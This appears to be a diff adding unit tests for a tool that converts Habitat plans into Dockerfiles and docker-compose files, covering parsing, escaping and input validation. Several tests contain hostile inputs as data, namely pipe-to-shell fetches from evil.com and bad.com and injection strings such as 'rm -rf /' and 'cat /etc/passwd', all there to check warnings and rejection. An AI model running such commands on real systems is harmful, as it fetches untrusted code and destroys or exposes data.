+
+    def test_validation_jinja2_syntax_valid(self):
+        """Test Jinja2 syntax validation with valid template."""
+        engine = ValidationEngine()
+        template = "{{ variable }}\n{% if condition %}text{% endif %}"
+
+        engine._validate_jinja2_syntax(template)
+
+        # Should pass validation
+        assert len([r for r in engine.results if r.level.value == "error"]) == 0
+
+    def test_validation_deep_variable_nesting(self):
+        """Test validation warns about deep variable nesting."""
+        engine = ValidationEngine()
+        template = "{{ var.level1.level2.level3.level4.level5.level6 }}"
+
+        engine._validate_variable_references(template)
+
+        # Should have info about deep nesting
+        infos = [r for r in engine.results if r.level == ValidationLevel.INFO]
+        assert len(infos) > 0
+        assert any("Deep variable nesting" in i.message for i in infos)
+
+    def test_validation_python_syntax_valid(self):
+        """Test Python syntax validation with valid code."""
+        engine = ValidationEngine()
+        code = """
+def test_function():
+    assert True
+"""
+        engine._validate_python_syntax(code)
+
+        # Should pass validation
+        assert len([r for r in engine.results if r.level.value == "error"]) == 0
+
+    def test_validation_python_syntax_invalid(self):
+        """Test Python syntax validation catches syntax errors."""
+        engine = ValidationEngine()
+        code = """
+def test_function(
+    invalid syntax here
+"""
+        engine._validate_python_syntax(code)
+
+        # Should have error about syntax
+        errors = [r for r in engine.results if r.level == ValidationLevel.ERROR]
+        assert len(errors) > 0
+        assert any("syntax" in e.message.lower() for e in errors)
+
+
+class TestHabitatConversion:
+    """Test suite for Habitat to container conversion tools."""
+
+    def test_parse_habitat_plan_success(self):
+        """Test parsing a valid Habitat plan file."""
+        with patch("souschef.parsers.habitat._normalize_path") as mock_normalize:
+            mock_file = MagicMock(spec=Path)
+            mock_file.exists.return_value = True
+            mock_file.is_dir.return_value = False
+            mock_file.read_text.return_value = """
+pkg_name=nginx
+pkg_origin=core
+pkg_version="1.25.3"
+pkg_maintainer="Test <test@example.com>"
+pkg_license=('BSD-2-Clause')
+pkg_description="Test package"
+pkg_upstream_url="https://example.com"
+pkg_source="https://example.com/nginx.tar.gz"
+pkg_build_deps=(
+  core/gcc
+  core/make
+)
+pkg_deps=(
+  core/glibc
+  core/openssl
+)
+pkg_exports=(
+  [port]=http.port
+  [ssl-port]=http.ssl_port
+)
+pkg_binds_optional=(
+  [backend]="port"
+)
+pkg_svc_run="nginx -g 'daemon off;'"
+pkg_svc_user="hab"
+pkg_svc_group="hab"
+
+do_build() {
+  ./configure --prefix=/usr/local
+  make
+}
+
+do_install() {
+  make install
+}
+"""
+            mock_normalize.return_value = mock_file
+
+            result = parse_habitat_plan("/fake/plan.sh")
+
+            # Should return valid JSON
+            assert not result.startswith("Error")
+            plan = json.loads(result)
+            assert plan["package"]["name"] == "nginx"
+            assert plan["package"]["version"] == "1.25.3"
+            assert "gcc" in str(plan["dependencies"]["build"])
+            assert len(plan["ports"]) == 2
+            assert "do_build" in plan["callbacks"]
+
+    def test_parse_habitat_plan_file_not_found(self):
+        """Test parsing a non-existent Habitat plan."""
+        with patch("souschef.parsers.habitat._normalize_path") as mock_normalize:
+            mock_file = MagicMock(spec=Path)
+            mock_file.exists.return_value = False
+            mock_normalize.return_value = mock_file
+
+            result = parse_habitat_plan("/nonexistent/plan.sh")
+
+            assert result.startswith("Error: File not found")
+
+    def test_parse_habitat_plan_is_directory(self):
+        """Test parsing when path is a directory."""
+        with patch("souschef.parsers.habitat._normalize_path") as mock_normalize:
+            mock_file = MagicMock(spec=Path)
+            mock_file.exists.return_value = True
+            mock_file.is_dir.return_value = True
+            mock_normalize.return_value = mock_file
+
+            result = parse_habitat_plan("/fake/directory")
+
+            assert result.startswith("Error:")
+            assert "directory" in result.lower()
+
+    def test_extract_plan_var(self):
+        """Test extracting variables from Habitat plan."""
+        content = """
+pkg_name=nginx
+pkg_version="1.25.3"
+pkg_maintainer='Test User'
+"""
+        from souschef.server import _extract_plan_var
+
+        assert _extract_plan_var(content, "pkg_name") == "nginx"
+        assert _extract_plan_var(content, "pkg_version") == "1.25.3"
+        assert _extract_plan_var(content, "pkg_maintainer") == "Test User"
+        assert _extract_plan_var(content, "pkg_nonexistent") == ""
+
+    def test_extract_plan_var_with_escaped_quotes(self):
+        """Test extracting variables with escaped quotes from Habitat plan."""
+        content = """
+pkg_maintainer="Team \\"SousChef\\""
+pkg_description='It\\'s a great tool'
+pkg_comment=# This is a comment
+pkg_value=something  # inline comment
+"""
+        from souschef.server import _extract_plan_var
+
+        # Test escaped double quotes
+        assert _extract_plan_var(content, "pkg_maintainer") == 'Team \\"SousChef\\"'
+        # Test escaped single quotes
+        assert _extract_plan_var(content, "pkg_description") == "It\\'s a great tool"
+        # Test that commented lines are skipped
+        assert _extract_plan_var(content, "pkg_comment") == ""
+        # Test that inline comments are not included
+        assert _extract_plan_var(content, "pkg_value") == "something"
+
+    def test_extract_plan_array(self):
+        """Test extracting arrays from Habitat plan."""
+        content = """
+pkg_build_deps=(
+  core/gcc
+  core/make
+  core/openssl
+)
+pkg_empty=()
+"""
+        from souschef.server import _extract_plan_array
+
+        deps = _extract_plan_array(content, "pkg_build_deps")
+        assert "core/gcc" in deps
+        assert "core/make" in deps
+        assert len(deps) == 3
+
+        empty = _extract_plan_array(content, "pkg_empty")
+        assert len(empty) == 0
+
+    def test_extract_plan_exports(self):
+        """Test extracting port exports from Habitat plan."""
+        content = """
+pkg_exports=(
+  [port]=http.port
+  [ssl-port]=http.ssl_port
+  [admin]=admin.port
+)
+"""
+        from souschef.server import _extract_plan_exports
+
+        exports = _extract_plan_exports(content, "pkg_exports")
+        assert len(exports) == 3
+        assert any(e["name"] == "port" for e in exports)
+        assert any(e["name"] == "ssl-port" for e in exports)
+        assert any(e["name"] == "admin" for e in exports)
+        assert any(e["value"] == "http.ssl_port" for e in exports)
+
+    def test_extract_plan_function(self):
+        """Test extracting function bodies from Habitat plan."""
+        content = """
+do_build() {
+  ./configure --prefix=/usr/local
+  make
+}
+
+do_install() {
+  make install
+}
+"""
+        from souschef.server import _extract_plan_function
+
+        build = _extract_plan_function(content, "do_build")
+        assert "./configure" in build
+        assert "make" in build
+
+        install = _extract_plan_function(content, "do_install")
+        assert "make install" in install
+
+        nonexistent = _extract_plan_function(content, "do_nonexistent")
+        assert nonexistent == ""
+
+    def test_update_quote_state_single_quotes(self):
+        """Test _update_quote_state with single quotes."""
+        from souschef.server import _update_quote_state
+
+        # Entering single quote
+        result = _update_quote_state("'", False, False, False, False)
+        assert result == (True, False, False, False)  # in_single_quote becomes True
+
+        # Exiting single quote
+        result = _update_quote_state("'", True, False, False, False)
+        assert result == (False, False, False, False)  # in_single_quote becomes False
+
+        # Single quote ignored when in double quotes
+        result = _update_quote_state("'", False, True, False, False)
+        assert result == (False, True, False, False)  # no change
+
+        # Single quote ignored when in backticks
+        result = _update_quote_state("'", False, False, True, False)
+        assert result == (False, False, True, False)  # no change
+
+    def test_update_quote_state_double_quotes(self):
+        """Test _update_quote_state with double quotes."""
+        from souschef.server import _update_quote_state
+
+        # Entering double quote
+        result = _update_quote_state('"', False, False, False, False)
+        assert result == (False, True, False, False)  # in_double_quote becomes True
+
+        # Exiting double quote
+        result = _update_quote_state('"', False, True, False, False)
+        assert result == (False, False, False, False)  # in_double_quote becomes False
+
+        # Double quote ignored when in single quotes
+        result = _update_quote_state('"', True, False, False, False)
+        assert result == (True, False, False, False)  # no change
+
+        # Double quote ignored when in backticks
+        result = _update_quote_state('"', False, False, True, False)
+        assert result == (False, False, True, False)  # no change
+
+    def test_update_quote_state_backticks(self):
+        """Test _update_quote_state with backticks."""
+        from souschef.server import _update_quote_state
+
+        # Entering backtick
+        result = _update_quote_state("`", False, False, False, False)
+        assert result == (False, False, True, False)  # in_backtick becomes True
+
+        # Exiting backtick
+        result = _update_quote_state("`", False, False, True, False)
+        assert result == (False, False, False, False)  # in_backtick becomes False
+
+        # Backtick ignored when in single quotes
+        result = _update_quote_state("`", True, False, False, False)
+        assert result == (True, False, False, False)  # no change
+
+        # Backtick ignored when in double quotes
+        result = _update_quote_state("`", False, True, False, False)
+        assert result == (False, True, False, False)  # no change
+
+    def test_update_quote_state_escape_sequences(self):
+        """Test _update_quote_state with escape sequences."""
+        from souschef.server import _update_quote_state
+
+        # Backslash sets escape_next flag
+        result = _update_quote_state("\\", False, False, False, False)
+        assert result == (False, False, False, True)  # escape_next becomes True
+
+        # Next character after escape is ignored
+        result = _update_quote_state('"', False, False, False, True)
+        assert result == (
+            False,
+            False,
+            False,
+            False,
+        )  # escape consumed, quotes not changed
+
+        result = _update_quote_state("'", False, False, False, True)
+        assert result == (False, False, False, False)  # escape consumed
+
+        result = _update_quote_state("n", False, False, False, True)
+        assert result == (False, False, False, False)  # escape consumed
+
+    def test_update_quote_state_nested_scenarios(self):
+        """Test _update_quote_state with nested quote scenarios."""
+        from souschef.server import _update_quote_state
+
+        # Parse: echo "It's a test"
+        # Start with no quotes
+        states = [(False, False, False, False)]
+
+        # Process: echo "It's a test"
+        for ch in '"It\'s a test"':
+            prev = states[-1]
+            states.append(_update_quote_state(ch, *prev))
+
+        # After opening ", in double quotes
+        assert states[1] == (False, True, False, False)
+        # Single quote inside double quotes doesn't change state
+        assert states[5] == (False, True, False, False)  # After '
+        # After closing ", back to no quotes
+        assert states[-1] == (False, False, False, False)
+
+    def test_update_quote_state_regular_characters(self):
+        """Test _update_quote_state with regular characters."""
+        from souschef.server import _update_quote_state
+
+        # Regular characters don't change quote state
+        result = _update_quote_state("a", False, False, False, False)
+        assert result == (False, False, False, False)
+
+        result = _update_quote_state("1", False, False, False, False)
+        assert result == (False, False, False, False)
+
+        result = _update_quote_state(" ", False, False, False, False)
+        assert result == (False, False, False, False)
+
+        # Regular characters maintain existing quote state
+        result = _update_quote_state("a", True, False, False, False)
+        assert result == (True, False, False, False)
+
+        result = _update_quote_state("a", False, True, False, False)
+        assert result == (False, True, False, False)
+
+        result = _update_quote_state("a", False, False, True, False)
+        assert result == (False, False, True, False)
+
+    def test_convert_habitat_to_dockerfile_success(self):
+        """Test converting a Habitat plan to Dockerfile."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "nginx",
+                        "origin": "core",
+                        "version": "1.25.3",
+                        "maintainer": "Test <test@example.com>",
+                        "description": "Test nginx package",
+                        "source": "https://example.com/nginx-1.25.3.tar.gz",
+                    },
+                    "dependencies": {
+                        "build": ["core/gcc", "core/make"],
+                        "runtime": ["core/glibc", "core/openssl"],
+                    },
+                    "ports": [
+                        {"name": "port", "value": "http.port"},
+                        {"name": "ssl-port", "value": "http.ssl_port"},
+                    ],
+                    "binds": [],
+                    "service": {
+                        "run": "nginx -g 'daemon off;'",
+                        "user": "hab",
+                        "group": "hab",
+                    },
+                    "callbacks": {
+                        "do_build": "./configure --prefix=/usr/local\nmake",
+                        "do_install": "make install",
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh", "ubuntu:22.04")
+
+            # Should generate a valid Dockerfile
+            assert "FROM ubuntu:22.04" in result
+            assert "LABEL maintainer=" in result
+            assert "LABEL version=" in result
+            assert "RUN apt-get" in result
+            assert "./configure" in result
+            assert "make install" in result
+            assert "EXPOSE 80" in result
+            assert "EXPOSE 443" in result
+            assert "USER hab" in result
+            assert "CMD" in result
+
+    def test_convert_habitat_to_dockerfile_install_vars(self):
+        """Test that do_install replaces Habitat variables."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "myapp",
+                        "origin": "core",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {
+                        "do_install": "cp -r . $pkg_prefix\nchmod +x $pkg_prefix/bin/myapp",
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Should replace Habitat variables in install steps
+            assert "RUN cp -r . /usr/local" in result
+            assert "RUN chmod +x /usr/local/bin/myapp" in result
+            # Original variables should not appear
+            assert "$pkg_prefix" not in result
+            # CMD should use JSON array format for single-word commands too
+            assert 'CMD ["myapp"]' in result
+
+    def test_convert_habitat_to_dockerfile_apt_packages_escaped(self):
+        """Test that apt package names are properly shell-escaped."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            # Mock plan with dependencies that will be mapped to apt packages
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "myapp",
+                        "origin": "core",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {
+                        "build": ["core/gcc", "core/make"],
+                        "runtime": ["core/openssl"],
+                    },
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {},
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Package names should be present in apt-get install command
+            assert "apt-get install -y" in result
+            assert "gcc" in result
+            assert "make" in result
+            assert "libssl-dev" in result
+            # Verify shell injection characters would be escaped (no actual injection here,
+            # but the code path uses shlex.quote())
+            assert "apt-get update" in result
+
+    def test_convert_habitat_to_dockerfile_dangerous_pattern_warning(self):
+        """Test that dangerous command patterns trigger warnings in generated Dockerfile."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            # Mock plan with potentially dangerous commands
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "suspicious",
+                        "origin": "untrusted",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {
+                        "do_build": 'curl https://example.com/script.sh | sh\neval "$(wget -O- https://bad.com/code)"',
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Should include warning comments for dangerous patterns
+            assert "# WARNING: Potentially dangerous command pattern detected" in result
+            # The dangerous commands should still be present (so user can review)
+            assert "curl https://example.com/script.sh | sh" in result
+            assert "eval" in result
+
+    def test_convert_habitat_to_dockerfile_label_escaping(self):
+        """Test that LABEL values with quotes are properly escaped."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            # Mock plan with quotes in metadata fields
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "myapp",
+                        "origin": "core",
+                        "version": "1.0.0",
+                        "maintainer": 'Team "SousChef" <team@example.com>',
+                        "description": 'It\'s a great tool with "features"',
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {},
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # LABEL values should be properly escaped with json.dumps()
+            # json.dumps escapes double quotes with backslashes
+            assert 'LABEL maintainer="Team \\"SousChef\\" <team@example.com>"' in result
+            assert (
+                'LABEL description="It\'s a great tool with \\"features\\""' in result
+            )
+            # Should not have unescaped quotes that would break Dockerfile syntax
+            assert 'LABEL maintainer="Team "SousChef"' not in result
+
+    def test_convert_habitat_to_dockerfile_label_newlines_rejected(self):
+        """Test that LABEL values with newlines are rejected to prevent Dockerfile syntax errors."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            # Mock plan with newlines in metadata fields
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "myapp",
+                        "origin": "core",
+                        "version": "1.0.0",
+                        "maintainer": "Team SousChef\nSecond Line <team@example.com>",
+                        "description": "A great tool\nwith multiple lines",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {},
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Newlines should be rejected with warning comments
+            assert "WARNING: Maintainer field contains newlines" in result
+            assert "WARNING: Description field contains newlines" in result
+            # Should not have LABEL directives with newlines
+            assert "LABEL maintainer=" not in result
+            assert "LABEL description=" not in result
+            # But version should still work
+            assert 'LABEL version="1.0.0"' in result
+
+    def test_convert_habitat_to_dockerfile_dangerous_pattern_after_var_replacement(
+        self,
+    ):
+        """Test that dangerous patterns are detected AFTER variable replacement."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            # Mock plan with commands that become dangerous after var replacement
+            # Example: $pkg_prefix/../../../etc/passwd would become
+            # /usr/local/../../../etc/passwd
+            # Or commands that hide dangerous patterns in variables
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "malicious",
+                        "origin": "evil",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "malicious"},
+                    "callbacks": {
+                        # Command that looks safe before replacement but dangerous after
+                        "do_build": "mkdir $pkg_prefix && curl http://evil.com/script.sh | sh"
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Should detect dangerous pattern AFTER variable replacement
+            assert "WARNING: Potentially dangerous command pattern detected" in result
+            # The command should still be included (with warning)
+            assert (
+                "RUN mkdir /usr/local && curl http://evil.com/script.sh | sh" in result
+            )
+
+    def test_convert_habitat_to_dockerfile_parse_error(self):
+        """Test Dockerfile conversion when plan parsing fails."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = "Error: File not found"
+
+            result = convert_habitat_to_dockerfile("/nonexistent/plan.sh")
+
+            assert result.startswith("Error: File not found")
+
+    def test_convert_habitat_to_dockerfile_with_quoted_cmd(self):
+        """Test Dockerfile conversion with quoted arguments in run command."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            # Mock plan with command containing quoted strings
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "nginx",
+                        "origin": "core",
+                        "version": "1.25.3",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "nginx -g 'daemon off;'"},
+                    "callbacks": {},
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Verify that shlex.split() correctly handled the quoted string
+            # Should be ["nginx", "-g", "daemon off;"] not ["nginx", "-g", "'daemon", "off;'"]
+            cmd_line = next(
+                line for line in result.splitlines() if line.lstrip().startswith("CMD ")
+            )
+            cmd_json = cmd_line.lstrip()[len("CMD ") :].strip()
+            cmd_args = json.loads(cmd_json)
+            assert cmd_args == ["nginx", "-g", "daemon off;"]
+
+    def test_map_habitat_deps_to_apt(self):
+        """Test mapping Habitat dependencies to apt packages."""
+        from souschef.server import _map_habitat_deps_to_apt
+
+        deps = [
+            "core/gcc",
+            "core/make",
+            "core/openssl",
+            "core/unknown-package",
+        ]
+        apt_packages = _map_habitat_deps_to_apt(deps)
+
+        assert "gcc" in apt_packages
+        assert "make" in apt_packages
+        assert "libssl-dev" in apt_packages
+        assert "unknown-package" in apt_packages
+
+    def test_extract_default_port(self):
+        """Test extracting default port numbers."""
+        from souschef.server import _extract_default_port
+
+        assert _extract_default_port("http") == "80"
+        assert _extract_default_port("https") == "443"
+        assert _extract_default_port("ssl-port") == "443"
+        assert _extract_default_port("port") == "8080"
+        assert _extract_default_port("postgresql") == "5432"
+        assert _extract_default_port("unknown") == ""
+
+    def test_needs_data_volume(self):
+        """Test detecting when a service needs a data volume."""
+        from souschef.server import _needs_data_volume
+
+        # Should detect volume need from do_init callback
+        plan_with_init = {
+            "package": {"name": "nginx"},
+            "callbacks": {"do_init": "mkdir -p /var/lib/app/data"},
+        }
+        assert _needs_data_volume(plan_with_init) is True
+
+        # Should detect volume need from database package names
+        plan_postgres = {
+            "package": {"name": "postgresql"},
+            "callbacks": {},
+        }
+        assert _needs_data_volume(plan_postgres) is True
+
+    def test_validate_docker_image_name_valid(self):
+        """Test validation of valid Docker image names."""
+        from souschef.server import _validate_docker_image_name
+
+        # Standard images
+        assert _validate_docker_image_name("ubuntu:22.04") is True
+        assert _validate_docker_image_name("nginx:latest") is True
+        assert _validate_docker_image_name("alpine:3.18") is True
+
+        # With registry
+        assert _validate_docker_image_name("docker.io/library/ubuntu:22.04") is True
+        assert _validate_docker_image_name("gcr.io/my-project/app:v1.0") is True
+        assert _validate_docker_image_name("myregistry.com:5000/app:latest") is True
+
+        # Without tag (implicitly latest)
+        assert _validate_docker_image_name("ubuntu") is True
+        assert _validate_docker_image_name("nginx") is True
+
+        # With digest
+        assert (
+            _validate_docker_image_name(
+                "ubuntu@sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
+            )
+            is True
+        )
+
+        # Complex valid names
+        assert _validate_docker_image_name("my-app.test_123:v1.2.3-alpha") is True
+
+    def test_validate_docker_image_name_invalid(self):
+        """Test validation rejects invalid Docker image names."""
+        from souschef.server import _validate_docker_image_name
+
+        # Injection attempts
+        assert _validate_docker_image_name("ubuntu:22.04; rm -rf /") is False
+        assert _validate_docker_image_name("ubuntu:22.04\nRUN malicious") is False
+        assert _validate_docker_image_name("ubuntu:22.04 && curl evil.com") is False
+
+        # Shell metacharacters
+        assert _validate_docker_image_name("ubuntu|cat /etc/passwd") is False
+        assert _validate_docker_image_name("ubuntu$(whoami)") is False
+        assert _validate_docker_image_name("ubuntu`id`") is False
+        assert _validate_docker_image_name("ubuntu>output.txt") is False
+
+        # Invalid formats
+        assert _validate_docker_image_name("") is False
+        assert _validate_docker_image_name(cast(str, None)) is False
+        assert _validate_docker_image_name(cast(str, 123)) is False
+
+        # Too long
+        assert _validate_docker_image_name("a" * 300) is False
+
+    def test_convert_habitat_to_dockerfile_invalid_base_image(self):
+        """Test Dockerfile conversion rejects invalid base image names."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {"name": "nginx", "origin": "core"},
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {},
+                    "callbacks": {},
+                }
+            )
+
+            # Injection attempt with newline
+            result = convert_habitat_to_dockerfile(
+                "/fake/plan.sh", "ubuntu:22.04\nRUN malicious"
+            )
+            assert "Error" in result
+            assert "Invalid Docker image name" in result
+
+            # Injection attempt with semicolon
+            result = convert_habitat_to_dockerfile(
+                "/fake/plan.sh", "ubuntu:22.04; rm -rf /"
+            )
+            assert "Error" in result
+            assert "Invalid Docker image name" in result
+
+            # Shell command injection
+            result = convert_habitat_to_dockerfile("/fake/plan.sh", "ubuntu$(whoami)")
+            assert "Error" in result
+            assert "Invalid Docker image name" in result
+
+    def test_validate_docker_network_name_valid(self):
+        """Test validation of valid Docker network names."""
+        from souschef.server import _validate_docker_network_name
+
+        # Standard names
+        assert _validate_docker_network_name("habitat_net") is True
+        assert _validate_docker_network_name("my-network") is True
+        assert _validate_docker_network_name("app.network") is True
+        assert _validate_docker_network_name("net123") is True
+
+        # With mixed characters
+        assert _validate_docker_network_name("my_app-network.v1") is True
+        assert _validate_docker_network_name("backend_db") is True
+
+        # Edge cases
+        assert _validate_docker_network_name("a") is True  # Single character
+        assert (
+            _validate_docker_network_name("network_with_63_chars_" + "x" * 28) is True
+        )
+
+    def test_validate_docker_network_name_invalid(self):
+        """Test validation rejects invalid Docker network names."""
+        from souschef.server import _validate_docker_network_name
+
+        # YAML injection attempts
+        assert _validate_docker_network_name("net: malicious") is False
+        assert _validate_docker_network_name("net\nservices:") is False
+        assert _validate_docker_network_name("net{key:value}") is False
+        assert _validate_docker_network_name("net[item]") is False
+
+        # Special characters that could break YAML
+        assert _validate_docker_network_name("net#comment") is False
+        assert _validate_docker_network_name("net|command") is False
+        assert _validate_docker_network_name("net>redirect") is False
+        assert _validate_docker_network_name("net&background") is False
+        assert _validate_docker_network_name("net*wildcard") is False
+
+        # Invalid formats
+        assert _validate_docker_network_name("") is False
+        assert _validate_docker_network_name("   ") is False
+        assert _validate_docker_network_name(cast(str, None)) is False
+        assert _validate_docker_network_name(cast(str, 123)) is False
+
+        # Too long (> 63 chars)
+        assert _validate_docker_network_name("a" * 64) is False
+
+        # Spaces
+        assert _validate_docker_network_name("my network") is False
+
+    def test_generate_compose_from_habitat_invalid_network_name(self):
+        """Test docker-compose generation rejects invalid network names."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {"name": "nginx"},
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {},
+                    "callbacks": {},
+                }
+            )
+
+            # YAML injection with colon
+            result = generate_compose_from_habitat(
+                "/fake/plan.sh", "net: malicious_config"
+            )
+            assert "Invalid Docker network name" in result
+
+            # YAML injection with newline
+            result = generate_compose_from_habitat("/fake/plan.sh", "net\nservices:")
+            assert "Invalid Docker network name" in result
+
+            # Special characters
+            result = generate_compose_from_habitat("/fake/plan.sh", "net{inject}")
+            assert "Invalid Docker network name" in result
+
+    def test_generate_compose_from_habitat_single_service(self):
+        """Test generating docker-compose.yml from a single Habitat plan."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {"name": "nginx", "version": "1.25.3"},
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [{"name": "port", "value": "http.port"}],
+                    "binds": [],
+                    "service": {"run": "nginx -g 'daemon off;'"},
+                    "callbacks": {},
+                }
+            )
+
+            result = generate_compose_from_habitat("/fake/plan.sh", "test_net")
+
+            # Should generate valid docker-compose.yml
+            assert "version: '3.8'" in result
+            assert "services:" in result
+            assert "nginx:" in result
+            assert "build:" in result
+            assert "dockerfile: Dockerfile.nginx" in result
+            assert "ports:" in result
+            assert '"8080:8080"' in result  # "port" maps to 8080 by default
+            assert "networks:" in result
+            assert "test_net:" in result
+            assert "driver: bridge" in result
+
+    def test_generate_compose_from_habitat_multiple_services(self):
+        """Test generating docker-compose.yml from multiple Habitat plans."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+
+            def mock_parse_side_effect(path):
+                if "nginx" in path:
+                    return json.dumps(
+                        {
+                            "package": {"name": "nginx"},
+                            "dependencies": {"build": [], "runtime": []},
+                            "ports": [{"name": "port", "value": "http.port"}],
+                            "binds": [{"name": "backend", "value": "port"}],
+                            "service": {"run": "nginx"},
+                            "callbacks": {},
+                        }
+                    )
+                elif "postgresql" in path:
+                    return json.dumps(
+                        {
+                            "package": {"name": "postgresql"},
+                            "dependencies": {"build": [], "runtime": []},
+                            "ports": [{"name": "port", "value": "postgresql.port"}],
+                            "binds": [],
+                            "service": {"run": "postgres -D /var/lib/app/pgdata"},
+                            "callbacks": {},
+                        }
+                    )
+                return json.dumps({})
+
+            mock_parse.side_effect = mock_parse_side_effect
+
+            result = generate_compose_from_habitat(
+                "/fake/nginx/plan.sh,/fake/postgresql/plan.sh", "app_net"
+            )
+
+            # Should have both services
+            assert "nginx:" in result
+            assert "postgresql:" in result
+            assert "depends_on:" in result
+            assert "backend" in result
+            assert "volumes:" in result
+            assert "postgresql_data:" in result
+
+    def test_generate_compose_from_habitat_parse_error(self):
+        """Test docker-compose generation when plan parsing fails."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = "Error: File not found"
+
+            result = generate_compose_from_habitat("/nonexistent/plan.sh")
+
+            assert result.startswith("Error parsing")
+            assert "File not found" in result
+
+    def test_habitat_plan_with_init_callback(self):
+        """Test Dockerfile generation with init callback."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "postgresql",
+                        "origin": "core",
+                        "version": "14.5",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "postgres", "user": "postgres"},
+                    "callbacks": {
+                        "do_init": "mkdir -p /var/lib/app/pgdata\ninitdb -D /var/lib/app/pgdata",
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Should include init steps
+            assert "# Initialization steps" in result
+            assert "mkdir -p /var/lib/app/pgdata" in result
+            assert "initdb" in result
+
+    def test_build_compose_service_basic(self):
+        """Test _build_compose_service with basic service configuration."""
+        from souschef.server import _build_compose_service
+
+        plan = {
+            "package": {"name": "nginx", "version": "1.25.3"},
+            "ports": [],
+            "binds": [],
+            "callbacks": {},
+        }
+
+        service = _build_compose_service(plan, "nginx")
+
+        # Verify basic structure
+        assert service["container_name"] == "nginx"
+        assert service["build"]["context"] == "."
+        assert service["build"]["dockerfile"] == "Dockerfile.nginx"
+        assert service["networks"] == []
+        assert service["environment"] == []
+
+    def test_build_compose_service_with_ports(self):
+        """Test _build_compose_service with port configuration."""
+        from souschef.server import _build_compose_service
+
+        plan = {
+            "package": {"name": "web", "version": "1.0.0"},
+            "ports": [
+                {"name": "http", "value": "http.port"},
+                {"name": "https", "value": "http.ssl_port"},
+            ],
+            "binds": [],
+            "callbacks": {},
+        }
+
+        service = _build_compose_service(plan, "web")
+
+        # Verify ports are configured
+        assert "ports" in service
+        assert "80:80" in service["ports"]
+        assert "443:443" in service["ports"]
+
+        # Verify environment variables for ports
+        assert "HTTP=80" in service["environment"]
+        assert "HTTPS=443" in service["environment"]
+
+    def test_build_compose_service_with_volumes(self):
+        """Test _build_compose_service detects need for data volumes."""
+        from souschef.server import _build_compose_service
+
+        # Plan with do_init that creates data directories
+        plan = {
+            "package": {"name": "postgres", "version": "14.5"},
+            "ports": [{"name": "postgresql", "value": "postgres.port"}],
+            "binds": [],
+            "callbacks": {
+                "do_init": "mkdir -p /var/lib/app/pgdata\ninitdb -D /var/lib/app/pgdata"
+            },
+        }
